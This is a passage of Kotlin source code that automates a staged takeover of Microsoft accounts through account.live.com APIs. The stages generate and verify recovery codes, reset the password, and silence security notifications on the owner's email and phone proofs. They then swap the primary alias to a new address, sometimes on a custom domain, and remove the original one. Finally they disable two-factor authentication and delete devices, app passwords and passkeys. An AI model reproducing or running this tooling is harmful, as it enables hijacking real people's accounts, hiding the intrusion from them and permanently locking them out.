            """.trimIndent()
            logger.error("Stage 4 extraction failed. {}", debugDetail)
            val msg = "Failed to extract encryptedNetId or apiCanary from additional proofs page"
            stageListener?.invoke("4", "Proofs Enumeration", false, "$msg\n$debugDetail")
            StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PROOFS_ENUMERATION, msg))
        } else {
            stageListener?.invoke("4", "Proofs Enumeration", true, "encryptedNetId received")
            StageExecution.Success(proofsData)
        }
    } catch (e: CancellationException) {
        throw e
    } catch (e: Exception) {
        val msg = "Network timeout or Microsoft rate limit hit: ${e.message}"
        stageListener?.invoke("4", "Proofs Enumeration", false, msg)
        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PROOFS_ENUMERATION, msg, cause = e))
    }

    private suspend fun executeStage5(
        client: HttpClient,
        encryptedNetId: String,
        canary: String,
        stageListener: StageListener?,
    ): StageExecution<Pair<String, String>> {
        val generateRecoveryResponse = client.post("https://account.live.com/API/Proofs/GenerateRecoveryCode") {
            contentType(ContentType.Application.Json)
            header("canary", canary)
            header("x-ms-apiVersion", "2")
            header("x-ms-apiTransport", "xhr")
            setBody(GenerateRecoveryCodeRequest(encryptedNetId = encryptedNetId))
        }

        val genCodeData = runCatching { generateRecoveryResponse.body<GenerateRecoveryCodeResponse>() }.getOrNull()
        val initialRecoveryCode = genCodeData?.recoveryCode
        if (initialRecoveryCode.isNullOrBlank()) {
            val msg = "Failed to generate initial recovery code: ${genCodeData?.error?.message ?: generateRecoveryResponse.bodyAsText()}"
            stageListener?.invoke("5", "Recovery Code Gen", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.RECOVERY_CODE_GENERATION, msg, genCodeData?.error?.code))
        }

        stageListener?.invoke("5", "Recovery Code Gen", true, "RecoveryCode generated")
        val updatedCanary = genCodeData.apiCanary?.takeIf { it.isNotBlank() } ?: canary
        return StageExecution.Success(Pair(initialRecoveryCode, updatedCanary))
    }

    private suspend fun markPasswordRotationFailed(email: String, reason: String) {
        accountRepository?.let { repo ->
            try {
                repo.updateStatus(email, RecoveredAccount.STATUS_FAILED, reason)
            } catch (err: Exception) {
                if (err is CancellationException) throw err
                logger.error("Failed to mark account FAILED for {}: {}", email, err.message, err)
            }
        }
    }

    private fun JsonObject?.firstNonBlankString(vararg keys: String): String? {
        if (this == null) return null
        for (key in keys) {
            val value = runCatching { this[key]?.jsonPrimitive?.contentOrNull }.getOrNull()
            if (!value.isNullOrBlank()) return value
        }
        return null
    }

    private fun extractErrorDetails(rawJson: JsonObject?, typedError: microsoft.recovery.model.RecoveryErrorData?): Pair<String?, String?>? {
        if (typedError != null) {
            val baseMsg = typedError.message?.takeIf { it.isNotBlank() } ?: typedError.code
            val fullMsg = if (!typedError.data.isNullOrBlank()) {
                listOfNotNull(baseMsg, "data=${typedError.data}").joinToString(" ")
            } else {
                baseMsg
            }
            return Pair(typedError.code, fullMsg)
        }
        val errorElement = rawJson?.get("error") ?: rawJson?.get("Error") ?: return null
        if (errorElement is JsonNull) return null
        return when (errorElement) {
            is JsonObject -> {
                val code = errorElement["code"]?.jsonPrimitive?.contentOrNull
                    ?: errorElement["Code"]?.jsonPrimitive?.contentOrNull
                val data = errorElement["data"]?.jsonPrimitive?.contentOrNull
                    ?: errorElement["Data"]?.jsonPrimitive?.contentOrNull
                val baseMessage = errorElement["message"]?.jsonPrimitive?.contentOrNull
                    ?: errorElement["Message"]?.jsonPrimitive?.contentOrNull
                    ?: code
                    ?: errorElement.toString()
                val fullMessage = if (!data.isNullOrBlank()) "$baseMessage data=$data" else baseMessage
                Pair(code, fullMessage)
            }
            else -> Pair(null, runCatching { errorElement.jsonPrimitive.contentOrNull }.getOrNull() ?: errorElement.toString())
        }
    }

    private suspend fun executeStage6(
        client: HttpClient,
        email: String,
        newPassword: String,
        newEmail: String,
        initialRecoveryCode: String,
        canary: String,
        stageListener: StageListener?,
    ): StageExecution<Pair<String, String>> = try {
        val resetPageResponse = client.get("https://account.live.com/ResetPassword.aspx") {
            parameter("wreply", "https://login.live.com/oauth20_authorize.srf")
            parameter("mn", email)
        }
        val resetHtml = resetPageResponse.bodyAsText()
        val resetData = RecoveryParsers.extractResetPasswordData(resetHtml, MicrosoftHttpClientFactory.json)
            ?: run {
                val msg = "Failed to extract sRecoveryToken or reset canary from reset password page"
                logger.error(
                    "Stage 6 ResetPassword extraction failed: status={}, finalUrl={}, length={}",
                    resetPageResponse.status,
                    resetPageResponse.request.url,
                    resetHtml.length,
                )
                markPasswordRotationFailed(email, msg)
                stageListener?.invoke("6", "Password Reset", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg))
            }

        logger.info(
            "Stage 6 ResetPassword loaded: status={}, finalUrl={}, sRecoveryTokenLength={}, resetApiCanaryLength={}",
            resetPageResponse.status,
            resetPageResponse.request.url,
            resetData.sRecoveryToken.length,
            resetData.apiCanary.length,
        )

        val verifyCodeRequest = VerifyRecoveryCodeRequest(
            publicKey = "2CBB3761027476727BDDBC9DE02870BE01ED793A",
            recoveryCode = initialRecoveryCode,
            code = initialRecoveryCode,
            scid = 100103,
            token = resetData.sRecoveryToken,
            uiflvr = 1001,
        )

        val verifyCodeResponse = client.post("https://account.live.com/API/Recovery/VerifyRecoveryCode") {
            contentType(ContentType.Application.Json)
            header("canary", resetData.apiCanary)
            setBody(verifyCodeRequest)
        }

        val verifyRaw = verifyCodeResponse.bodyAsText()
        val verifyData = runCatching {
            MicrosoftHttpClientFactory.json.decodeFromString<VerifyRecoveryCodeResponse>(verifyRaw)
        }.getOrNull()
        val verifyJson = runCatching {
            MicrosoftHttpClientFactory.json.parseToJsonElement(verifyRaw).jsonObject
        }.getOrNull()
        val verifyError = extractErrorDetails(verifyJson, verifyData?.error)
        val verificationGrantToken = verifyData?.token?.takeIf { it.isNotBlank() }
            ?: verifyJson.firstNonBlankString("token", "Token")

        val canaryFromVerifyJson = verifyJson.firstNonBlankString("apiCanary", "canary", "sCanary")
        val canaryAfterVerify = verifyData?.apiCanary?.takeIf { it.isNotBlank() }
            ?: canaryFromVerifyJson
            ?: run {
                logger.warn("Stage 6 VerifyRecoveryCode did not return a new apiCanary; falling back to reset page apiCanary")
                resetData.apiCanary
            }

        logger.info(
            "Stage 6 VerifyRecoveryCode response: status={}, hasError={}, hasGrantToken={}, grantTokenLength={}, hasNewCanary={}",
            verifyCodeResponse.status,
            verifyError != null,
            !verificationGrantToken.isNullOrBlank(),
            verificationGrantToken?.length ?: 0,
            verifyData?.apiCanary?.isNotBlank() == true || canaryFromVerifyJson != null,
        )

        if (!verifyCodeResponse.status.isSuccess() || verifyError != null || verificationGrantToken.isNullOrBlank()) {
            val msg = "Failed to verify recovery code: ${verifyError?.second ?: "HTTP ${verifyCodeResponse.status.value} $verifyRaw"}"
            logger.error("Stage 6 VerifyRecoveryCode failed: {}", verifyRaw.take(500))
            markPasswordRotationFailed(email, msg)
            stageListener?.invoke("6", "Password Reset", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg, verifyError?.first))
        }

        if (verificationGrantToken == resetData.sRecoveryToken) {
            val msg = "VerifyRecoveryCode returned sRecoveryToken instead of elevated grant token"
            logger.error("Stage 6 VerifyRecoveryCode returned unchanged sRecoveryToken (len={})", verificationGrantToken.length)
            markPasswordRotationFailed(email, msg)
            stageListener?.invoke("6", "Password Reset", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg))
        }

        val contactEmailForReset = newEmail.trim()
            .takeIf { it.isNotBlank() && !it.equals(email.trim(), ignoreCase = true) }
            ?: ""
        val recoverRequest = RecoverUserRequest(
            contactEmail = contactEmailForReset,
            contactEpid = "",
            password = newPassword,
            passwordExpiryEnabled = 0,
            publicKey = "2CBB3761027476727BDDBC9DE02870BE01ED793A",
            token = verificationGrantToken,
        )

        logger.info(
            "=== STAGE 6 RECOVERUSER DEBUG === tokenLength={}, sRecoveryTokenLength={}, contactEmail={}, apiCanary={}, canaryChangedFromReset={}, publicKey={}",
            recoverRequest.token.length,
            resetData.sRecoveryToken.length,
            recoverRequest.contactEmail,
            canaryAfterVerify,
            canaryAfterVerify != resetData.apiCanary,
            recoverRequest.publicKey,
        )

        val recoverUserResponse = client.post("https://account.live.com/API/Recovery/RecoverUser") {
            contentType(ContentType.Application.Json)
            header("canary", canaryAfterVerify)
            setBody(recoverRequest)
        }

        val recoverRaw = recoverUserResponse.bodyAsText()
        val recoverUserData = runCatching {
            MicrosoftHttpClientFactory.json.decodeFromString<RecoverUserResponse>(recoverRaw)
        }.getOrNull()
        val recoverJson = runCatching {
            MicrosoftHttpClientFactory.json.parseToJsonElement(recoverRaw).jsonObject
        }.getOrNull()
        val recoverError = extractErrorDetails(recoverJson, recoverUserData?.error)
        val finalRecoveryCode = recoverUserData?.recoveryCode

        logger.info(
            "Stage 6 RecoverUser response: status={}, enableTfa={}, hasError={}, hasNewRecoveryCode={}",
            recoverUserResponse.status,
            recoverUserData?.enableTfa,
            recoverError != null,
            !finalRecoveryCode.isNullOrBlank() && finalRecoveryCode != initialRecoveryCode,
        )

        if (!recoverUserResponse.status.isSuccess() || recoverError != null || finalRecoveryCode.isNullOrBlank()) {
            logger.error(
                "Stage 6 RecoverUser failed: status={}, rawBody={}, sentTokenLen={}, contactEmail={}, apiCanary={}",
                recoverUserResponse.status,
                recoverRaw.take(800),
                recoverRequest.token.length,
                recoverRequest.contactEmail,
                canaryAfterVerify,
            )
            val msg = "Failed to recover user credentials: ${recoverError?.second ?: "HTTP ${recoverUserResponse.status.value} $recoverRaw"}"
            markPasswordRotationFailed(email, msg)
            stageListener?.invoke(
                "6",
                "Password Reset",
                false,
                "$msg\n[tokenLen=${recoverRequest.token.length}, sRecovLen=${resetData.sRecoveryToken.length}, contactEmail=${recoverRequest.contactEmail}, canaryLen=${canaryAfterVerify.length}, canaryChanged=${canaryAfterVerify != resetData.apiCanary}]",
            )
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg, recoverError?.first))
        }

        if (finalRecoveryCode == initialRecoveryCode) {
            val msg = "RecoverUser returned unchanged recoveryCode; password update could not be verified"
            markPasswordRotationFailed(email, msg)
            stageListener?.invoke("6", "Password Reset", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg))
        }

        stageListener?.invoke("6", "Password Reset", true, "Password changed & new code")
        val canaryAfterRecover = recoverUserData.apiCanary?.takeIf { it.isNotBlank() } ?: canaryAfterVerify
        StageExecution.Success(Pair(finalRecoveryCode, canaryAfterRecover))
    } catch (e: CancellationException) {
        throw e
    } catch (e: Exception) {
        val msg = "Password reset request failed: ${e.message}"
        markPasswordRotationFailed(email, msg)
        stageListener?.invoke("6", "Password Reset", false, msg)
        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg, cause = e))
    }

    private suspend fun executeStage7(
        client: HttpClient,
        uaid: String,
        emailProofs: List<ProofItem>,
        smsProofs: List<ProofItem>,
        canary: String,
        stageListener: StageListener?,
    ): StageExecution<Pair<Int, String>> {
        var activeCanary = canary
        var suppressedCount = 0
        val targetProofs = emailProofs + smsProofs

        for (proof in targetProofs) {
            val suppressionResponse = client.post("https://account.live.com/API/Proofs/SetUserNotificationState") {
                contentType(ContentType.Application.Json)
                header("canary", activeCanary)
                setBody(
                    SetUserNotificationStateRequest(
                        proofDetails = listOf(
                            NotificationProofDetail(
                                name = proof.name,
                                notificationEnabled = false,
                                type = proof.type,
                            )
                        ),
                        uaid = uaid,
                    )
                )
            }

            if (!suppressionResponse.status.isSuccess()) {
                val msg = "Notification suppression failed for proof ${proof.name}: HTTP ${suppressionResponse.status.value}"
                stageListener?.invoke("7", "Notification Suppression", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.NOTIFICATION_SUPPRESSION, msg))
            }

            val canaryResponse = runCatching { suppressionResponse.body<GenericCanaryResponse>() }.getOrNull()
            if (!canaryResponse?.apiCanary.isNullOrBlank()) {
                activeCanary = canaryResponse.apiCanary
            }
            suppressedCount++

            if (stageDelayMs > 0) delay(stageDelayMs)
        }

        stageListener?.invoke("7", "Notification Suppression", true, "$suppressedCount proofs disabled")
        return StageExecution.Success(Pair(suppressedCount, activeCanary))
    }

    private suspend fun executeStage8(
        client: HttpClient,
        cookieStorage: CookiesStorage,
        email: String,
        newEmail: String,
        uaid: String,
        canary: String,
        stageListener: StageListener?,
        aliasOtcProvider: (suspend (String) -> String)? = null,
    ): StageExecution<Pair<String, String>> {
        var activeCanary = canary
        val targetAliasEmail: String
        val clientAlias = aliasClient

        if (clientAlias != null) {
            val aliasResult = runCatching {
                clientAlias.rotateAlias(
                    currentCanary = activeCanary,
                    oldEmail = email,
                    httpClient = client,
                    customAlias = if (newEmail.endsWith("@qhuyy.tech", ignoreCase = true)) newEmail else null,
                    aliasOtcProvider = aliasOtcProvider,
                    cookieStorage = cookieStorage,
                    sessionUaid = uaid,
                    debugListener = { detail ->
                        stageListener?.invoke("8-debug", "Stage 8 Request Debug", true, detail)
                    },
                )
            }.getOrElse { e ->
                if (e is CancellationException) throw e
                val msg = e.message ?: "Custom domain alias rotation failed"
                val detail = if (e is SessionExpiredException && !e.redirectLocation.isNullOrBlank()) {
                    "$msg\nLocation: ${e.redirectLocation}"
                } else {
                    msg
                }
                stageListener?.invoke("8", "Alias Rotation", false, detail)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg, cause = e))
            }
            targetAliasEmail = aliasResult.newEmail
            activeCanary = aliasResult.updatedCanary
            stageListener?.invoke("8", "Alias Rotation", true, "Alias $targetAliasEmail verified and set as primary")
        } else {
            val targetEmail = if (newEmail.contains("@")) newEmail.trim() else "${newEmail.trim()}@outlook.com"
            val newAliasPrefix = targetEmail.substringBefore("@")
            val targetDomain = targetEmail.substringAfter("@")
            targetAliasEmail = targetEmail

            val noRedirectClient = HttpClient(client.engine) {
                followRedirects = false
            }

            val addAliasResult = runCatching {
                noRedirectClient.use { stageClient ->
                    val (refreshCookieHeader, _) = buildIsolatedAccountCookieHeader(cookieStorage, "GET /proofs/manage/additional")
                    val manageResponse = stageClient.get("https://account.live.com/proofs/manage/additional") {
                        header(HttpHeaders.UserAgent, MicrosoftHttpClientFactory.DEFAULT_USER_AGENT)
                        header(HttpHeaders.AcceptLanguage, "en-US,en;q=0.9")
                        if (refreshCookieHeader.isNotBlank()) {
                            header(HttpHeaders.Cookie, refreshCookieHeader)
                        }
                    }
                    for (rawHeader in manageResponse.headers.getAll(HttpHeaders.SetCookie).orEmpty()) {
                        val parsed = runCatching { parseServerSetCookieHeader(rawHeader) }.getOrNull()
                        if (parsed != null && parsed.name.isNotBlank()) {
                            cookieStorage.addCookie(
                                Url("https://account.live.com"),
                                parsed.copy(domain = parsed.domain ?: "account.live.com", path = parsed.path ?: "/"),
                            )
                        }
                    }
                    val manageLocation = manageResponse.headers[HttpHeaders.Location]
                    if ((manageResponse.status == HttpStatusCode.Found ||
                            manageResponse.status == HttpStatusCode.SeeOther ||
                            manageResponse.status == HttpStatusCode.TemporaryRedirect) &&
                        manageLocation != null &&
                        (manageLocation.contains("login.microsoftonline.com", ignoreCase = true) ||
                            manageLocation.contains("login.live.com", ignoreCase = true))
                    ) {
                        logger.error(
                            "Stage 8 GET /proofs/manage/additional {} redirect Location before SessionExpiredException: {}",
                            manageResponse.status.value,
                            manageLocation,
                        )
                        throw SessionExpiredException(
                            "Session expired during Alias Rotation. Cannot add alias.",
                            redirectLocation = manageLocation,
                        )
                    }
                    val manageHtml = runCatching { manageResponse.bodyAsText() }.getOrDefault("")
                    val freshCanary = RecoveryParsers.extractApiCanary(manageHtml, MicrosoftHttpClientFactory.json)
                    if (!freshCanary.isNullOrBlank()) {
                        activeCanary = freshCanary
                    }

                    val actualCookieUaid = cookieStorage.get(Url("https://login.live.com"))
                        .firstOrNull { it.name == "uaid" }
                        ?.value
                        ?.takeIf { it.isNotBlank() }

                    val (addCookieHeader, maskedCookies) = buildIsolatedAccountCookieHeader(cookieStorage, "POST /AddAssocId")
                    val formPairs = buildList {
                        add("canary" to activeCanary)
                        add("PostOption" to "NONE")
                        add("SingleDomain" to targetDomain)
                        add("UpSell" to "")
                        add("AddAssocIdOptions" to "LIVE")
                        add("AssociatedIdLive" to newAliasPrefix)
                        if (actualCookieUaid != null) {
                            add("uaid" to actualCookieUaid)
                        }
                    }

                    val maskedHeaders = buildString {
                        appendLine("canary=${maskSecretValue(activeCanary)}")
                        appendLine("Referer=https://account.live.com/proofs/manage/additional")
                        appendLine("Origin=https://account.live.com")
                        appendLine("User-Agent=${MicrosoftHttpClientFactory.DEFAULT_USER_AGENT}")
                        appendLine("Accept-Language=en-US,en;q=0.9")
                        append("Cookie=$maskedCookies")
                    }
                    val maskedParams = buildString {
                        append(
                            formPairs.joinToString("\n") { (k, v) ->
                                val display = if (k == "canary") maskSecretValue(v) else if (v.isEmpty()) "(empty)" else v
                                "$k=$display"
                            }
                        )
                        if (actualCookieUaid == null) {
                            append("\nuaid=(omitted - no uaid cookie under login.live.com)")
                        }
                    }

                    logger.info(
                        "Stage 8 POST /AddAssocId debug:\nHeaders:\n{}\nForm:\n{}",
                        maskedHeaders,
                        maskedParams,
                    )
                    stageListener?.invoke(
                        "8-debug",
                        "Stage 8 Request Debug",
                        true,
                        "**Headers:**\n```text\n$maskedHeaders\n```\n**Form Parameters:**\n```text\n$maskedParams\n```",
                    )

                    val postResponse = stageClient.submitForm(
                        url = "https://account.live.com/AddAssocId",
                        formParameters = parameters {
                            for ((key, value) in formPairs) {
                                append(key, value)
                            }
                        },
                    ) {
                        header("canary", activeCanary)
                        header("Referer", "https://account.live.com/proofs/manage/additional")
                        header("Origin", "https://account.live.com")
                        header(HttpHeaders.UserAgent, MicrosoftHttpClientFactory.DEFAULT_USER_AGENT)
                        header(HttpHeaders.AcceptLanguage, "en-US,en;q=0.9")
                        if (addCookieHeader.isNotBlank()) {
                            header(HttpHeaders.Cookie, addCookieHeader)
                        }
                    }

                    val addLocation = postResponse.headers[HttpHeaders.Location]
                    if ((postResponse.status == HttpStatusCode.Found ||
                            postResponse.status == HttpStatusCode.SeeOther ||
                            postResponse.status == HttpStatusCode.TemporaryRedirect) &&
                        addLocation != null &&
                        addLocation.contains("login.microsoftonline.com", ignoreCase = true)
                    ) {
                        logger.error(
                            "Stage 8 AddAssocId {} redirect Location before SessionExpiredException: {}",
                            postResponse.status.value,
                            addLocation,
                        )
                        throw SessionExpiredException(
                            "Session expired during Alias Rotation. Cannot add alias.",
                            redirectLocation = addLocation,
                        )
                    }
                    postResponse
                }
            }.getOrElse { e ->
                if (e is CancellationException) throw e
                val msg = e.message ?: "AddAssocId failed"
                val detail = if (e is SessionExpiredException && !e.redirectLocation.isNullOrBlank()) {
                    "$msg\nLocation: ${e.redirectLocation}"
                } else {
                    msg
                }
                stageListener?.invoke("8", "Alias Rotation", false, detail)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg, cause = e))
            }

            if (!addAliasResult.status.isSuccess() &&
                addAliasResult.status != HttpStatusCode.Found &&
                addAliasResult.status != HttpStatusCode.SeeOther
            ) {
                val msg = "AddAssocId failed: HTTP ${addAliasResult.status.value}"
                stageListener?.invoke("8", "Alias Rotation", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg))
            }

            if (stageDelayMs > 0) delay(stageDelayMs)

            val makePrimaryResponse = client.post("https://account.live.com/API/MakePrimary") {
                contentType(ContentType.Application.Json)
                header("canary", activeCanary)
                setBody(
                    MakePrimaryRequest(
                        aliasName = targetAliasEmail,
                        emailChecked = true,
                        removeOldPrimary = false,
                        uaid = uaid,
                    )
                )
            }

            if (!makePrimaryResponse.status.isSuccess()) {
                val msg = "MakePrimary request failed: HTTP ${makePrimaryResponse.status.value}"
                stageListener?.invoke("8", "Alias Rotation", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg))
            }

            val makePrimaryData = runCatching { makePrimaryResponse.body<GenericCanaryResponse>() }.getOrNull()
            if (makePrimaryData?.error?.code != null) {
                val msg = "MakePrimary rejected: ${makePrimaryData.error.message ?: makePrimaryData.error.code}"
                stageListener?.invoke("8", "Alias Rotation", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg, makePrimaryData.error.code))
            }
            if (!makePrimaryData?.apiCanary.isNullOrBlank()) {
                activeCanary = makePrimaryData.apiCanary
            }

            if (stageDelayMs > 0) delay(stageDelayMs)

            val removeAliasResponse = client.submitForm(
                url = "https://account.live.com/names/manage",
                formParameters = parameters {
                    append("canary", activeCanary)
                    append("action", "RemoveAlias")
                    append("aliasName", email)
                    append("displayName", email)
                },
            )
            val removeAliasHtml = runCatching { removeAliasResponse.bodyAsText() }.getOrDefault("")
            val confirmed = removeAliasHtml.contains("Note_AssociatedIdRemoved")
            if (!confirmed && !removeAliasResponse.status.isSuccess()) {
                val msg = "RemoveAlias failed: HTTP ${removeAliasResponse.status.value}"
                stageListener?.invoke("8", "Alias Rotation", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg))
            }
            stageListener?.invoke("8", "Alias Rotation", true, "New alias verified and set as primary")
        }

        return StageExecution.Success(Pair(targetAliasEmail, activeCanary))
    }

    private fun maskSecretValue(value: String): String {
        if (value.isEmpty()) return "(empty)"
        if (value.length <= 8) return "*** (len=${value.length})"
        return "${value.take(4)}...${value.takeLast(4)} (len=${value.length})"
    }

    private suspend fun buildIsolatedAccountCookieHeader(
        cookieStorage: CookiesStorage,
        operationName: String,
    ): Pair<String, String> {
        val merged = linkedMapOf<String, Cookie>()
        for (cookie in cookieStorage.get(Url("https://login.live.com"))) {
            merged[cookie.name] = cookie
        }
        for (cookie in cookieStorage.get(Url("https://account.live.com"))) {
            merged[cookie.name] = cookie
        }

        val requiredNames = listOf("__Host-MSAAUTH", "AMRPSSecAuth", "amsc")
        val isolated = requiredNames.mapNotNull { name ->
            merged[name]?.takeIf { it.value.isNotBlank() }?.let { name to it.value }
        }
        val missing = requiredNames.filter { name -> isolated.none { it.first == name } }
        val maskedSummary = if (isolated.isEmpty()) {
            "(none; missing=${missing.joinToString(",")})"
        } else {
            val attached = isolated.joinToString("; ") { (name, value) -> "$name=${maskSecretValue(value)}" }
            if (missing.isEmpty()) attached else "$attached | missing=${missing.joinToString(",")}"
        }
        logger.info(
            "Stage 8 cookie isolation for {}: {}, allStorageCookieNames={}",
            operationName,
            maskedSummary,
            merged.keys.joinToString(","),
        )
        return isolated.joinToString("; ") { (name, value) -> "$name=$value" } to maskedSummary
    }

    private suspend fun executeStage9(
        client: HttpClient,
        uaid: String,
        passKeyIds: List<String>,
        canary: String,
        stageListener: StageListener?,
    ) {
        var activeCanary = canary

        val disableTfaResponse = client.post("https://account.live.com/API/Proofs/DisableTfa") {
            contentType(ContentType.Application.Json)
            header("canary", activeCanary)
            header("X-Requested-With", "XMLHttpRequest")
            setBody(SecurityCleanupRequest(uaid = uaid))
        }
        val disableTfaData = runCatching { disableTfaResponse.body<GenericCanaryResponse>() }.getOrNull()
        if (!disableTfaData?.apiCanary.isNullOrBlank()) {
            activeCanary = disableTfaData.apiCanary
        }

        if (stageDelayMs > 0) delay(stageDelayMs)

        val deleteDevicesResponse = client.post("https://account.live.com/API/Proofs/DeleteDevices") {
            contentType(ContentType.Application.Json)
            header("canary", activeCanary)
            header("X-Requested-With", "XMLHttpRequest")
            setBody(SecurityCleanupRequest(uaid = uaid))
        }
        val deleteDevicesData = runCatching { deleteDevicesResponse.body<GenericCanaryResponse>() }.onFailure {
            if (it is CancellationException) {
                currentCoroutineContext().ensureActive()
            }
        }.getOrNull()
        if (!deleteDevicesData?.apiCanary.isNullOrBlank()) {
            activeCanary = deleteDevicesData.apiCanary
        }

        if (stageDelayMs > 0) delay(stageDelayMs.milliseconds)

        val deleteAppPasswordResponse = client.post("https://account.live.com/API/Proofs/DeleteAppPassword") {
            contentType(ContentType.Application.Json)
            header("canary", activeCanary)
            header("X-Requested-With", "XMLHttpRequest")
            setBody(SecurityCleanupRequest(uaid = uaid))
        }
        val deleteAppPasswordData = runCatching { deleteAppPasswordResponse.body<GenericCanaryResponse>() }.getOrNull()
        if (!deleteAppPasswordData?.apiCanary.isNullOrBlank()) {
            activeCanary = deleteAppPasswordData.apiCanary
        }

        if (stageDelayMs > 0) delay(stageDelayMs)

        if (passKeyIds.isNotEmpty()) {
            for (keyId in passKeyIds) {
                val removePasskeyResponse = client.post("https://account.live.com/API/Proofs/RemovePasskey") {
                    contentType(ContentType.Application.Json)
                    header("canary", activeCanary)
                    header("X-Requested-With", "XMLHttpRequest")
                    setBody(SecurityCleanupRequest(passKeyId = keyId, uaid = uaid))
                }
                val removePasskeyData = runCatching { removePasskeyResponse.body<GenericCanaryResponse>() }.getOrNull()
                if (!removePasskeyData?.apiCanary.isNullOrBlank()) {
                    activeCanary = removePasskeyData.apiCanary
                }
                if (stageDelayMs > 0) delay(stageDelayMs)
            }
        } else {
            val removePasskeyResponse = client.post("https://account.live.com/API/Proofs/RemovePasskey") {
                contentType(ContentType.Application.Json)
                header("canary", activeCanary)
                header("X-Requested-With", "XMLHttpRequest")
                setBody(SecurityCleanupRequest(uaid = uaid))
            }
            val removePasskeyData = runCatching { removePasskeyResponse.body<GenericCanaryResponse>() }.getOrNull()
            if (!removePasskeyData?.apiCanary.isNullOrBlank()) {
                activeCanary = removePasskeyData.apiCanary
            }
        }

        stageListener?.invoke("9", "Cleanup", true, "Sessions revoked")
    }

    private sealed class StageExecution<out T> {
        data class Success<out T>(val value: T) : StageExecution<T>()
        data class Failure(val result: RecoveryResult.Failure) : StageExecution<Nothing>()
    }
}
